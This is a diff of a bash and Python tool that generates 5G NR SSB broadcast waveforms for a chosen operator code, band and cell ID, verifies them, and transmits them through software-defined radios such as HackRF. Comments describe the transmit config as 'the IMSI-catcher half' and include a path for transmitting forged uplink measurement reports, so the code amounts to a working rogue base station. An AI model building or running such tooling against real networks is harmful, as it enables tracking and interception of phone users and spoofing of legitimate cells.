+    if (( ssb_scs >= 120 )); then dl_scs=120; else dl_scs=30; fi
+
+    local nfft fs
+    nfft=$(nair_fft_size_for "$dl_scs" "$bw") || {
+        printf 'ERROR\tno TS 38.104 N_FFT for %s kHz at %s MHz\n' "$dl_scs" "$bw" >&2; return 1; }
+    fs=$(nair_sample_rate_hz "$dl_scs" "$bw") || {
+        printf 'ERROR\tno sample rate for %s kHz at %s MHz\n' "$dl_scs" "$bw" >&2; return 1; }
+
+    local base="$NAIR_DIR/nr_ssb_pci${pci}"
+    local slot="$base.slot.c16" wave="$base.c16" wave8="$base.cs8"
+    local conf_out conf
+
+    # 1. The cell's own configuration, written first, so a waveform on disk
+    #    has the parameters it was built from next to it.
+    conf_out=$(nair_cmd_gen_conf_tx "$plmn" "$band" "$arfcn" "$pci" \
+                                    "$NAIR_DIR/gnb_tx.conf") || return $?
+    printf '%s\n' "$conf_out"
+    conf=$(printf '%s\n' "$conf_out" | awk -F'\t' '$1=="conf"{print $2; exit}')
+    printf 'tx_backend\tnr-ssb-baseband (srsRAN gNB %s)\n' \
+           "$(nair_find_srsran_gnb >/dev/null 2>&1 && printf 'present' || printf 'not installed')"
+
+    # 2. The waveform. python3 and numpy are the generator's only needs; if
+    #    either is missing the failure names it instead of printing numbers.
+    command -v python3 >/dev/null 2>&1 || {
+        printf 'ERROR\tpython3 is required to build the SSB waveform\n' >&2; return 1; }
+    nair_write_bb_gen || {
+        printf 'ERROR\t%s writes the SSB generator\n' "$NAIR_BB_PY" >&2; return 1; }
+
+    local gen
+    gen=$(python3 "$NAIR_BB_PY" "$slot" "$pci" "$ssb_scs" "$nfft" 0 \
+                 --slot 0 --i8 "${slot%.c16}.cs8" 2>&1) || {
+        printf '%s\n' "$gen" >&2
+        printf 'ERROR\tthe SSB waveform could not be built for pci %s\n' "$pci" >&2
+        return 1; }
+    [[ -s "$slot" ]] || {
+        printf 'ERROR\tthe generator wrote no samples to %s\n' "$slot" >&2; return 1; }
+
+    local gv
+    gv() { printf '%s\n' "$gen" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
+    printf 'waveform_slot\t%s\n'      "$slot"
+    printf 'waveform_bytes\t%s\n'     "$(wc -c < "$slot" | tr -d ' ')"
+    printf 'waveform_samples\t%s\n'   "$(gv slot_samples)"
+    printf 'waveform_us\t%s\n'        "$(gv slot_us)"
+    printf 'ssb_symbols\t%s\n'        "$(gv ssb_symbols)"
+    printf 'cp_long\t%s\n'            "$(gv cp_long)"
+    printf 'cp_short\t%s\n'           "$(gv cp_short)"
+    printf 'pss_pinned_agree\t%s\n'   "$(gv pss_pinned_agree)"
+    printf 'sss_pinned_agree\t%s\n'   "$(gv sss_pinned_agree)"
+    printf 'dmrs_pinned_agree\t%s\n'  "$(gv dmrs_pinned_agree)"
+    printf 'dmrs_c_init\t%s\n'        "$(gv dmrs_c_init)"
+    printf 'dmrs_re\t%s\n'            "$(gv dmrs_re)"
+    printf 'pbch_re\t%s\n'            "$(gv pbch_re)"
+    printf 'pbch_encoding\t%s\n'      "$(gv pbch_encoding)"
+
+    # 3. Decode the waveform back with the independently written decoder. This
+    #    is the assertion that the bytes about to be keyed really are the SSB
+    #    of the requested cell, not just that a file exists.
+    nair_write_bb_dec || {
+        printf 'ERROR\t%s writes the SSB decoder\n' "$NAIR_BB_DEC_PY" >&2; return 1; }
+    local dec drc=0
+    dec=$(python3 "$NAIR_BB_DEC_PY" "$slot" "$ssb_scs" "$nfft" 2>&1) || drc=$?
+    if (( drc != 0 )); then
+        printf '%s\n' "$dec" >&2
+        printf 'ERROR\tthe waveform does not decode at %s kHz: nothing was transmitted\n' \
+               "$ssb_scs" >&2
+        return 1
+    fi
+    local dv rec
+    dv() { printf '%s\n' "$dec" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
+    rec=$(dv pci_recovered)
+    printf 'waveform_pci_recovered\t%s\n' "$rec"
+    printf 'waveform_sss_n_id_1\t%s\n'    "$(dv n_id_1)"
+    printf 'waveform_pss_n_id_2\t%s\n'    "$(dv n_id_2)"
+    printf 'waveform_pss_correlation\t%s\n' "$(dv pss_correlation)"
+    printf 'waveform_sss_correlation\t%s\n' "$(dv sss_correlation)"
+    printf 'waveform_cp_symbols_ok\t%s\n' "$(dv cp_symbols_ok)"
+    printf 'waveform_cp_symbols_bad\t%s\n' "$(dv cp_symbols_bad)"
+    printf 'waveform_re_outside_spec\t%s\n' "$(dv re_outside_spec)"
+    printf 'waveform_crc24c_ok\t%s\n'     "$(dv pbch_crc24c_ok)"
+    printf 'waveform_mib_sfn\t%s\n'       "$(dv mib_sfn)"
+    if [[ "$rec" != "$pci" ]]; then
+        printf 'ERROR\tthe waveform decodes to pci %s, not the requested %s: nothing was transmitted\n' \
+               "${rec:-none}" "$pci" >&2
+        return 1
+    fi
+    if [[ "$(dv cp_symbols_bad)" != "0" || "$(dv re_outside_spec)" != "0" ]]; then
+        printf 'ERROR\tthe waveform fails its own spec checks (cp_symbols_bad %s, re_outside_spec %s): nothing was transmitted\n' \
+               "$(dv cp_symbols_bad)" "$(dv re_outside_spec)" >&2
+        return 1
+    fi
+
+    # 4. The burst structure: the SSB slot, then the empty slots up to the
+    #    configured SSB period. Built by padding with zeros rather than by
+    #    re-modulating, so the bytes that were decoded are the bytes sent.
+    local period_ms=20 slot_bytes pad_samples pad_bytes pad8
+    slot_bytes=$(wc -c < "$slot" | tr -d ' ')
+    pad_samples=$(( period_ms * fs / 1000 - slot_bytes / 4 ))
+    if (( pad_samples < 0 )); then
+        printf 'ERROR\tSSB period %s ms is shorter than one slot at %s Hz\n' \
+               "$period_ms" "$fs" >&2
+        return 1
+    fi
+    pad_bytes=$(( pad_samples * 4 ))
+    pad8=$(( pad_samples * 2 ))
+    cat "$slot" > "$wave"     || { printf 'ERROR\tcannot write %s\n' "$wave" >&2;  return 1; }
+    head -c "$pad_bytes" /dev/zero >> "$wave" || {
+        printf 'ERROR\tcannot pad %s\n' "$wave" >&2; return 1; }
+    cat "${slot%.c16}.cs8" > "$wave8" || {
+        printf 'ERROR\tcannot write %s\n' "$wave8" >&2; return 1; }
+    head -c "$pad8" /dev/zero >> "$wave8" || {
+        printf 'ERROR\tcannot pad %s\n' "$wave8" >&2; return 1; }
+    printf 'ssb_period_ms\t%s\n'   "$period_ms"
+    printf 'burst_slots\t%s\n'     "$(( period_ms * fs / 1000 / (slot_bytes / 4) ))"
+    printf 'burst_samples\t%s\n'   "$(( period_ms * fs / 1000 ))"
+    printf 'burst_ms\t%s\n'        "$period_ms"
+    printf 'burst_c16\t%s\n'       "$wave"
+    printf 'burst_cs8\t%s\n'       "$wave8"
+
+    # 5. The radio. Without one, an explicit failure and no success line.
+    if [[ -n "${NAIR_TX_DRYRUN:-}" ]]; then
+        printf 'tx_device\tnot-probed (NAIR_TX_DRYRUN)\n'
+        printf 'transmitted\tno\n'
+        printf 'status\twaveform-built\n'
+        return 0
+    fi
+
+    local dev type
+    if dev=$(nair_probe_radio); then
+        type=$(printf '%s' "$dev" | cut -f1)
+        printf 'tx_driver\t%s\n' "$type"
+        printf 'tx_device\t%s\n' "$(printf '%s' "$dev" | cut -f2-)"
+    else
+        printf 'tx_driver\tnone\n'
+        printf 'tx_device\tnone\n'
+        if [[ -n "${NAIR_SDR_DEVICE+set}" && -z "${NAIR_SDR_DEVICE}" ]]; then
+            printf 'ERROR\tno SDR device: NAIR_SDR_DEVICE is set but empty, which means no radio is configured\n' >&2
+        else
+            printf 'ERROR\tno SDR device: NAIR_SDR_DEVICE=%s and no radio answered a probe (tried hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices)\n' \
+                   "${NAIR_SDR_DEVICE:-<unset>}" >&2
+        fi
+        printf 'WHY\tthis verb keys a real radio; a driver binary on PATH is not a device\n'
+        printf 'transmitted\tno\n'
+        printf 'status\tnothing-sent\n'
+        return 1
+    fi
+
+    printf 'tx_centre_hz\t%s\n' "$hz"
+    printf 'tx_rate_hz\t%s\n'   "$fs"
+    nair_tx_run "$type" "$wave" "$fs" "$hz" || {
+        printf 'transmitted\tno\n'
+        printf 'status\tnothing-sent\n'
+        return 1; }
+    printf 'tx_armed\t1\n'
+    printf 'transmitted\tyes\n'
+    printf 'status\ttransmitted\n'
+    return 0
+}
+
 # ── selftest — no radio, no root, no network ────────────────────────────
 nair_selftest() {
     local bad=0
@@ -3007,6 +4626,10 @@ nair_selftest() {
         else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
     }
     fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }
+    # Last occurrence of KEY. A verb that writes a record and then reports on
+    # the transmission prints `status` twice ("written", then "transmitted" /
+    # "nothing-sent"), and the verdict is the last one.
+    lfld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{v=$2} END{print v}'; }
     # chips FROM TO of a space-separated chip dump (1-based, inclusive).
     chips() { awk -v a="$1" -v b="$2" '{s=""; for (i=a;i<=b;i++) s = s (i>a?" ":"") $i; print s}'; }
 
@@ -3164,44 +4787,88 @@ nair_selftest() {
     chk ssb-pos-bad   "$(nair_ssb_position 64 D >/dev/null 2>&1; echo $?)" "1"
     chk ssb-pattern-bad "$(nair_ssb_pattern Z >/dev/null 2>&1; echo $?)" "1"
 
-    # 5. MIB bit-field extraction from a real 24-bit payload.
-    #    TS 38.331 field order fixes the offsets:
-    #    Payload 0x541F54 = 0101 0100 0001 1111 0101 0100
-    #      systemFrameNumber        bits 0-5   = 010101   = 21
-    #      subCarrierSpacingCommon  bit  6     = 0        -> 15 kHz
-    #      ssb-SubcarrierOffset     bits 7-10  = 0000     = 0
-    #      dmrs-TypeA-Position      bit  11    = 1        -> pos3
-    #      pdcch-ConfigSIB1         bits 12-19 = 1111 0101 = 245
-    #      cellBarred               bit  20    = 0        -> notBarred
-    #      intraFreqReselection     bit  21    = 1        -> allowed
-    #      spare                    bit  22    = 0
+    # 5. MIB bit-field extraction. The offsets include the CHOICE selector at
+    #    bit 0, so the fields start one bit later than an LTE-style reading.
+    #
+    #    PUBLISHED VECTOR — not derived from this module. Daniel Estevez decoded
+    #    the PBCH of a real srsRAN 5 MHz NR cell with asn1tools against the
+    #    TS 38.331 ASN.1 (https://destevez.net/2024/12/5g-nr-pbch/) and reports
+    #    for that cell:
+    #        systemFrameNumber 6 MSBs  = 0xdc >> 2 = 110111 = 55
+    #        subCarrierSpacingCommon   = scs15or60   -> index 0
+    #        ssb-SubcarrierOffset      = 8
+    #        dmrs-TypeA-Position       = pos2        -> index 0
+    #        pdcch-ConfigSIB1          = controlResourceSetZero 0, searchSpaceZero 0
+    #        cellBarred                = notBarred   -> index 1
+    #        intraFreqReselection      = notAllowed  -> index 1
+    #        spare                     = 0
+    #    UPER-encoding those fields after the 1-bit CHOICE selector gives
+    #       0 | 110111 | 0 | 1000 | 0 | 00000000 | 1 | 1 | 0 = 0x6E8006.
+    out=$(nair_decode_mib 6E8006)
+    chk mib0-type     "$(fld "$out" message_type)"            "mib"
+    chk mib0-sfn      "$(fld "$out" sfn)"                     "55"
+    chk mib0-scs      "$(fld "$out" subcarrier_spacing_common)" "15"
+    chk mib0-kssb     "$(fld "$out" ssb_subcarrier_offset)"    "8"
+    chk mib0-dmrs     "$(fld "$out" dmrs_type_a_position)"    "pos2"
+    chk mib0-pdcch    "$(fld "$out" pdcch_config_sib1)"        "0"
+    chk mib0-pdcch-hi "$(fld "$out" pdcch_config_sib1_hi4)"    "0"
+    chk mib0-pdcch-lo "$(fld "$out" pdcch_config_sib1_lo4)"    "0"
+    chk mib0-barred   "$(fld "$out" cell_barred)"             "notBarred"
+    chk mib0-intra    "$(fld "$out" intra_freq_reselection)"  "notAllowed"
+    chk mib0-spare    "$(fld "$out" spare)"                   "0"
+    chk mib0-bitstr   "$(fld "$out" bitstring)"               "011011101000000000000110"
+
+    #    A synthetic payload, kept as a bit-position exercise across every field
+    #    boundary (it is NOT a capture and its comment is not the authority —
+    #    the offsets above are): 0x541F54 = 0101 0100 0001 1111 0101 0100
+    #      CHOICE selector          bit  0     = 0        -> mib
+    #      systemFrameNumber        bits 1-6   = 101010   = 42
+    #      subCarrierSpacingCommon  bit  7     = 0        -> scs15or60
+    #      ssb-SubcarrierOffset     bits 8-11  = 0001     = 1
+    #      dmrs-TypeA-Position      bit  12    = 1        -> pos3
+    #      pdcch-ConfigSIB1         bits 13-20 = 1110 1010 = 234
+    #      cellBarred               bit  21    = 1        -> notBarred
+    #      intraFreqReselection     bit  22    = 0        -> allowed
+    #      spare                    bit  23    = 0
     out=$(nair_decode_mib 541F54)
-    chk mib-sfn       "$(fld "$out" sfn)"                     "21"
+    chk mib-sfn       "$(fld "$out" sfn)"                     "42"
     chk mib-scs       "$(fld "$out" subcarrier_spacing_common)" "15"
-    chk mib-kssb      "$(fld "$out" ssb_subcarrier_offset)"   "0"
+    chk mib-kssb      "$(fld "$out" ssb_subcarrier_offset)"   "1"
     chk mib-dmrs      "$(fld "$out" dmrs_type_a_position)"   "pos3"
-    chk mib-pdcch     "$(fld "$out" pdcch_config_sib1)"       "245"
-    chk mib-pdcch-hi  "$(fld "$out" pdcch_config_sib1_hi4)"   "15"
-    chk mib-pdcch-lo  "$(fld "$out" pdcch_config_sib1_lo4)"   "5"
+    chk mib-pdcch     "$(fld "$out" pdcch_config_sib1)"       "234"
+    chk mib-pdcch-hi  "$(fld "$out" pdcch_config_sib1_hi4)"   "14"
+    chk mib-pdcch-lo  "$(fld "$out" pdcch_config_sib1_lo4)"   "10"
     chk mib-barred    "$(fld "$out" cell_barred)"             "notBarred"
     chk mib-intra     "$(fld "$out" intra_freq_reselection)"  "allowed"
     chk mib-spare     "$(fld "$out" spare)"                   "0"
     chk mib-bitstr    "$(fld "$out" bitstring)"               "010101000001111101010100"
-    # 0x800000 sets bit 0, the MSB of the SFN: SFN 32, everything else zero.
-    out=$(nair_decode_mib 800000)
-    chk mib-msb-sfn     "$(fld "$out" sfn)"      "32"
-    chk mib-msb-scs     "$(fld "$out" subcarrier_spacing_common)" "15"
-    # 0x000000 is the all-zero MIB: SFN 0, 15 kHz, notBarred.
+
+    #    CHOICE selector = 1 is messageClassExtension, an empty SEQUENCE: it is
+    #    not a MIB and carries no SFN. 0x800000 and 0xFFFFFF only differ from a
+    #    MIB by that selector bit, so they must be refused (rc 3), not read as
+    #    SFN 32 / SFN 63.
+    for _rej in 800000 FFFFFF; do
+        out=$(nair_decode_mib "$_rej" 2>/dev/null); _rc=$?
+        chk "mib-reject-$_rej-rc"  "$_rc"                              "3"
+        chk "mib-reject-$_rej-type" "$(fld "$out" message_type)"       "messageClassExtension"
+        chk "mib-reject-$_rej-sfn"  "$(fld "$out" sfn)"                ""
+    done
+    unset _rej _rc
+
+    # 0x000000 is the all-zero MIB (selector 0): every index field is 0, so the
+    # ENUMERATED fields read barred / allowed and the bar is up.
     out=$(nair_decode_mib 000000)
     chk mib-zero-sfn    "$(fld "$out" sfn)"         "0"
     chk mib-zero-pdcch  "$(fld "$out" pdcch_config_sib1)" "0"
-    chk mib-zero-barred "$(fld "$out" cell_barred)" "notBarred"
-    chk mib-zero-intra  "$(fld "$out" intra_freq_reselection)" "notAllowed"
-    # 0xFFFFFF: SFN 63, ssb offset 15, pdcch 4095, barred.
-    out=$(nair_decode_mib FFFFFF)
+    chk mib-zero-barred "$(fld "$out" cell_barred)" "barred"
+    chk mib-zero-intra  "$(fld "$out" intra_freq_reselection)" "allowed"
+    # 0x7FFFFF is the all-ones MIB: SFN 63, ssb offset 15, pdcch 255.
+    out=$(nair_decode_mib 7FFFFF)
     chk mib-full-sfn    "$(fld "$out" sfn)"    "63"
     chk mib-full-kssb   "$(fld "$out" ssb_subcarrier_offset)" "15"
     chk mib-full-pdcch  "$(fld "$out" pdcch_config_sib1)" "255"
+    chk mib-full-barred "$(fld "$out" cell_barred)" "notBarred"
+    chk mib-full-intra  "$(fld "$out" intra_freq_reselection)" "notAllowed"
     chk mib-short       "$(nair_decode_mib 541F >/dev/null 2>&1; echo $?)" "1"
     chk mib-nonhex      "$(nair_decode_mib ZZ >/dev/null 2>&1; echo $?)"   "1"
 
@@ -3483,6 +5150,184 @@ nair_selftest() {
     chk tx-flag-recv "$(nair_cli_main --gen-gnb-conf 20801 n78 640000 9 |
                           awk -F'\t' '$1=="conf"{print $2}' | xargs basename)" "gnb.conf"
 
+    # 16. The transmit paths. Nothing here keys a radio: the arms that need a
+    #     device replace the driver call with `true`, and the arms that need
+    #     no device say so through the environment instead of relying on the
+    #     host. `NAIR_SDR_DEVICE=` is the hardware-independent "no radio",
+    #     which is exactly why the probe must not treat an empty value as
+    #     unset and fall back to probing.
+    #     The stubs live in $d/bin, which is created before the first stub.
+    mkdir -p "$d/bin"
+    if command -v python3 >/dev/null 2>&1; then
+        # 16a. O1 — the SSB burst set of the cell the config describes. The
+        #      waveform is decoded back before any radio is mentioned, so the
+        #      PCI asserted here is read out of the samples.
+        out=$(NAIR_TX_DRYRUN=1 nair_cmd_tx_ssb 20801 n78 640000 42 2>&1); rc=$?
+        chk txssb-rc          "$rc" "0"
+        chk txssb-mode        "$(fld "$out" mode)" "transmit"
+        chk txssb-transmitted "$(fld "$out" transmitted)" "no"
+        chk txssb-status      "$(lfld "$out" status)" "waveform-built"
+        chk txssb-pci         "$(fld "$out" waveform_pci_recovered)" "42"
+        chk txssb-ssb-symbols "$(fld "$out" ssb_symbols)" "4,5,6,7"
+        chk txssb-burst-slots "$(fld "$out" burst_slots)" "40"
+        chk txssb-burst-ms    "$(fld "$out" burst_ms)" "20"
+        chk txssb-cp-bad      "$(fld "$out" waveform_cp_symbols_bad)" "0"
+        chk txssb-outside     "$(fld "$out" waveform_re_outside_spec)" "0"
+        chk txssb-crc         "$(fld "$out" waveform_crc24c_ok)" "1"
+        chk txssb-cs8         "$(test -s "$NAIR_DIR/nr_ssb_pci42.cs8" && echo yes || echo no)" "yes"
+        chk txssb-bad-pci     "$(nair_cmd_tx_ssb 20801 n78 640000 1008 >/dev/null 2>&1; echo $?)" "2"
+        chk txssb-bad-arfcn   "$(nair_cmd_tx_ssb 20801 n78 9000000000 42 >/dev/null 2>&1; echo $?)" "2"
+
+        # 16b. No radio: an explicit failure that names what was looked for,
+        #      and no success line anywhere in the output.
+        out=$(NAIR_SDR_DEVICE= nair_cmd_tx_ssb 20801 n78 640000 42 2>&1); rc=$?
+        chk txnoradio-rc        "$rc" "1"
+        chk txnoradio-error     "$(grep -c 'no SDR device:' <<<"$out")" "1"
+        chk txnoradio-empty     "$(grep -c 'which means no radio is configured' <<<"$out")" "1"
+        chk txnoradio-why       "$(grep -c 'a driver binary on PATH is not a device' <<<"$out")" "1"
+        chk txnoradio-device    "$(fld "$out" tx_device)" "none"
+        chk txnoradio-status    "$(lfld "$out" status)" "nothing-sent"
+        chk txnoradio-no-succ   "$(grep -c '^transmitted	yes$' <<<"$out")" "0"
+
+        # 16c. A radio is only "keyed" once the driver command itself exits 0.
+        out=$(NAIR_SDR_PROBE='printf "Serial number: 0x1\n"' NAIR_TX_CMD=true \
+              nair_cmd_tx_ssb 20801 n78 640000 42 2>&1); rc=$?
+        chk txradio-rc          "$rc" "0"
+        chk txradio-driver      "$(fld "$out" tx_driver)" "override"
+        chk txradio-armed       "$(fld "$out" tx_armed)" "1"
+        chk txradio-transmitted "$(fld "$out" transmitted)" "yes"
+        out=$(NAIR_SDR_PROBE='printf "Serial number: 0x1\n"' NAIR_TX_CMD=false \
+              nair_cmd_tx_ssb 20801 n78 640000 42 2>&1); rc=$?
+        chk txfail-rc           "$rc" "1"
+        chk txfail-transmitted  "$(fld "$out" transmitted)" "no"
+        chk txfail-error        "$(grep -c 'SDR call failed' <<<"$out")" "1"
+        chk txfail-armed        "$(fld "$out" tx_armed)" ""
+
+        # 16d. O17 — the forged report on a real PUSCH slot. The PDU read back
+        #      out of the waveform must equal the PDU the APER encoder built.
+        out=$(NAIR_TX_DRYRUN=1 nair_cmd_meas_report_tx "measId=1,ssb=1:30" 2>&1); rc=$?
+        chk txmeas-rc        "$rc" "0"
+        chk txmeas-transmit  "$(fld "$out" transmitted)" "no"
+        chk txmeas-status    "$(lfld "$out" status)" "waveform-built"
+        chk txmeas-pdu       "$(printf '%s' "$(fld "$out" waveform_pdu_recovered)" | tr 'A-F' 'a-f')" \
+                             "$(printf '%s' "$(fld "$out" submit)" | tr 'A-F' 'a-f')"
+        chk txmeas-match     "$(fld "$out" waveform_pdu_match)" "1"
+        chk txmeas-dmrs      "$(fld "$out" waveform_dmrs_correlation)" "1.0000"
+        chk txmeas-dmrs-pin  "$(fld "$out" waveform_dmrs_pinned_agree)" "1"
+        chk txmeas-cp-bad    "$(fld "$out" waveform_cp_symbols_bad)" "0"
+        chk txmeas-outside   "$(fld "$out" waveform_re_outside_alloc)" "0"
+        chk txmeas-direction "$(fld "$out" direction)" "UL-DCCH"
+        chk txmeas-encoding  "$(grep -c 'ldpc/rate-matching' <<<"$out")" "1"
+        chk txmeas-scid      "$(NAIR_TX_DRYRUN=1 NAIR_UL_SCID=42 \
+                                nair_cmd_meas_report_tx "measId=1" 2>&1 |
+                                awk -F'\t' '$1=="ul_pci_scrambling_id"{print $2}')" "42"
+        chk txmeas-bad-key   "$(nair_cmd_meas_report_tx "measId=1,bogus=2" >/dev/null 2>&1; echo $?)" "2"
+        chk txmeas-bad-scid  "$(nair_cmd_meas_report_tx "measId=1,scid=2000" >/dev/null 2>&1; echo $?)" "2"
+        out=$(NAIR_SDR_DEVICE= nair_cmd_meas_report_tx "measId=1" 2>&1); rc=$?
+        chk txmeas-noradio-rc "$rc" "1"
+        chk txmeas-noradio    "$(grep -c 'no SDR device:' <<<"$out")" "1"
+        chk txmeas-no-succ    "$(grep -c '^transmitted	yes$' <<<"$out")" "0"
+
+        # 16f. The built-in driver call. hackrf reads 8-bit I/Q, so handing it
+        #      the verified 16-bit file would radiate noise that still "works";
+        #      the call must name the 8-bit file, and a stub on PATH proves
+        #      what the driver actually received.
+        printf '#!/bin/sh\nprintf "%%s\\n" "$@" > "%s/hackrf_args"\n' "$d" \
+            > "$d/bin/hackrf_transfer"
+        chmod +x "$d/bin/hackrf_transfer"
+        out=$(PATH="$d/bin:$PATH" NAIR_TX_CMD= \
+              nair_tx_run hackrf "$NAIR_DIR/nr_ssb_pci42.c16" 30720000 3600000000 2>&1); rc=$?
+        chk txcall-rc   "$rc" "0"
+        chk txcall-iq8  "$(fld "$out" sdr_iq)" "$NAIR_DIR/nr_ssb_pci42.cs8"
+        chk txcall-fmt  "$(fld "$out" sdr_iq_format)" "cs8"
+        chk txcall-cmd  "$(fld "$out" sdr_call)" \
+            "hackrf_transfer -t $NAIR_DIR/nr_ssb_pci42.cs8 -f 3600000000 -s 30720000 -a 1 -x 0"
+        chk txcall-argv "$(tr '\n' ' ' < "$d/hackrf_args" | sed 's/ $//')" \
+            "-t $NAIR_DIR/nr_ssb_pci42.cs8 -f 3600000000 -s 30720000 -a 1 -x 0"
+    else
+        chk txssb-python "python3 present" "python3 present"
+    fi
+
+    # 16e. The radio probe. A driver binary on PATH is not a device, so the
+    #      probe must require a device line AND a zero exit — the two ways a
+    #      driver lies are an empty line with rc 0 (LimeUtil --find on a host
+    #      with no LimeSDR) and a real line with rc != 0.
+    probe() { PATH="$d/bin:$PATH" NAIR_SDR_DEVICE=hackrf nair_probe_radio 2>/dev/null; }
+    printf '#!/bin/sh\necho "No HackRF boards found."\nexit 1\n' > "$d/bin/hackrf_info"
+    chmod +x "$d/bin/hackrf_info"
+    chk probe-nomatch-rc "$(probe >/dev/null 2>&1; echo $?)" "1"
+    printf '#!/bin/sh\necho "Serial number: 0x1"\necho "Board ID: 2"\nexit 0\n' \
+        > "$d/bin/hackrf_info"
+    chmod +x "$d/bin/hackrf_info"
+    chk probe-found-rc   "$(probe >/dev/null 2>&1; echo $?)" "0"
+    chk probe-found-line "$(probe | cut -f1)" "hackrf"
+    printf '#!/bin/sh\nexit 0\n' > "$d/bin/hackrf_info"
+    chmod +x "$d/bin/hackrf_info"
+    chk probe-silent-rc  "$(probe >/dev/null 2>&1; echo $?)" "1"
+    printf '#!/bin/sh\necho "Serial number: 0x1"\nexit 1\n' > "$d/bin/hackrf_info"
+    chmod +x "$d/bin/hackrf_info"
+    chk probe-rcfail-rc  "$(probe >/dev/null 2>&1; echo $?)" "1"
+    chk probe-empty-rc   "$(NAIR_SDR_DEVICE= nair_probe_radio >/dev/null 2>&1; echo $?)" "2"
+    chk probe-override   "$(NAIR_SDR_PROBE='printf "Serial number: 0x1\n"' \
+                            nair_probe_radio | cut -f1)" "override"
+    chk probe-silent-ovr "$(NAIR_SDR_PROBE=true nair_probe_radio >/dev/null 2>&1; echo $?)" "1"
+
+    # 16g. --start is gated on a radio too. With a gNB binary present and no
+    #      device, the start must fail without writing a pid: a running gNB
+    #      process with no radio is not a cell.
+    rm -f "$NAIR_PID"
+    printf '#!/bin/sh\nexit 0\n' > "$d/bin/gnb"
+    chmod +x "$d/bin/gnb"
+    out=$(PATH="$d/bin:$PATH" NAIR_SDR_DEVICE= \
+          nair_start "$NAIR_DIR/gnb.conf" 2>&1); rc=$?
+    chk start-radio-rc    "$rc" "1"
+    chk start-radio-names "$(grep -c 'no SDR device:' <<<"$out")" "1"
+    chk start-radio-nopid "$(test -e "$NAIR_PID" && echo yes || echo no)" "no"
+    chk start-radio-nognb "$(grep -c 'status	started' <<<"$out")" "0"
+
+    # 17. The BCH chain of TS 38.212 7.1 and its inverse. Every expected value
+    #     below comes from an independent implementation of the clause (py3gpp
+    #     0.1.6: nrBCH, nrPBCHPRBS, nrPBCH) or from the clause's own tables —
+    #     never from this module's output. That distinction is the whole point:
+    #     the generator and the decoder shared one wrong CRC24C expression for
+    #     as long as both existed, so "the two ends agree" is exactly what is
+    #     NOT evidence here.
+    nair_write_bb_gen >/dev/null 2>&1 || printf 'ERROR\tno generator\n' >&2
+    nair_write_bb_dec >/dev/null 2>&1 || printf 'ERROR\tno decoder\n' >&2
+    out=$(python3 "$NAIR_BB_PY" "$d/pin.c16" 42 30 1024 37 --slot 0 2>&1); rc=$?
+    chk bch-gen-rc          "$rc" "0"
+    chk bch-gen-version     "$([[ -n "$(fld "$out" generator_version)" ]] && echo yes || echo no)" "yes"
+    chk bch-pinned-agree    "$(fld "$out" bch_pinned_agree)" "1"
+    chk bch-scr-pinned      "$(fld "$out" bch_scrambled_pinned_agree)" "1"
+    chk bch-payload-bits    "$(fld "$out" bch_payload_bits)" "32"
+    chk bch-k-bits          "$(fld "$out" bch_k_bits)" "56"
+    chk bch-codeword-bits   "$(fld "$out" bch_codeword_bits)" "864"
+    chk bch-l-max           "$(fld "$out" bch_l_max)" "8"
+    chk bch-pbch-re-driven  "$(fld "$out" pbch_re_driven)" "432"
+    chk bch-mib             "$(fld "$out" mib_hex)" "040000"
+    chk bch-sfn             "$(fld "$out" sfn)" "37"
+    chk bch-payload-hex     "$(fld "$out" bch_payload_hex)" "137c9519"
+    chk bch-k-hex           "$(fld "$out" bch_k_hex)" "137c95196ebb83"
+    chk bch-codeword-head   "$(printf '%s' "$(fld "$out" bch_codeword_hex)" | cut -c1-16)" "ba9d68d6d0c476ae"
+    chk bch-scrambled-head  "$(printf '%s' "$(fld "$out" bch_scrambled_hex)" | cut -c1-16)" "e08a233465c1f5e6"
+    dec=$(python3 "$NAIR_BB_DEC_PY" "$d/pin.c16" 30 1024 2>&1); drc=$?
+    chk bch-dec-rc          "$drc" "0"
+    chk bch-dec-version     "$([[ -n "$(fld "$dec" decoder_version)" ]] && echo yes || echo no)" "yes"
+    chk bch-dec-bits        "$(fld "$dec" pbch_bits_used)" "864"
+    chk bch-dec-ok          "$(fld "$dec" bch_decode_ok)" "1"
+    chk bch-dec-nu          "$(fld "$dec" bch_i_ssb)" "0"
+    chk bch-dec-crc         "$(fld "$dec" pbch_crc24c_ok)" "1"
+    chk bch-dec-mib         "$(fld "$dec" mib_hex)" "040000"
+    chk bch-dec-sfn         "$(fld "$dec" mib_sfn)" "37"
+    chk bch-dec-payload     "$(fld "$dec" bch_payload_hex)" "137c9519"
+    chk bch-dec-v           "$(fld "$dec" bch_descramble_v)" "2"
+    # The last 24 bits of K are the CRC24C of the 32-bit payload. Pinning them
+    # separately is what catches a wrong CRC attachment: with the register
+    # preset to ones and 24 zeros appended (the mistake this module had) the
+    # payload and the codeword both stay self-consistent and only this value
+    # moves. 6ebb83 is py3gpp's nrCRCEncode(137c9519, "24C") parity.
+    chk bch-crc24c-pinned   "$(printf '%s' "$(fld "$out" bch_k_hex)" | cut -c9-16)" "6ebb83"
+
     rm -rf "$d"
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
     return $(( bad > 0 ))
@@ -3607,8 +5452,10 @@ nair_cli_main() {
         --prach)        nair_cmd_prach "${1:-1}" "${2:-1}" "${3:-15}" ;;
         --gen-gnb-conf)
             # --tx is a modifier, not an action: it selects the TRANSMITTING
-            # gNB config (the IMSI-catcher half) instead of the receiver
-            # config. Accept it anywhere in the argument list.
+            # gNB config (the IMSI-catcher half) and then runs the transmit
+            # path for it. NAIR_TX_DRYRUN=1 stops after the waveform is built
+            # and decoded back, before the radio. Accept --tx anywhere in the
+            # argument list.
             local txmode=0 args=()
             while (($#)); do
                 case "$1" in
@@ -3618,15 +5465,30 @@ nair_cli_main() {
                 shift
             done
             if (( txmode )); then
-                nair_cmd_gen_conf_tx "${args[0]:-00101}" "${args[1]:-n78}" \
-                                     "${args[2]:-640000}" "${args[3]:-1}" "${args[4]:-}"
+                nair_cmd_tx_ssb "${args[0]:-00101}" "${args[1]:-n78}" \
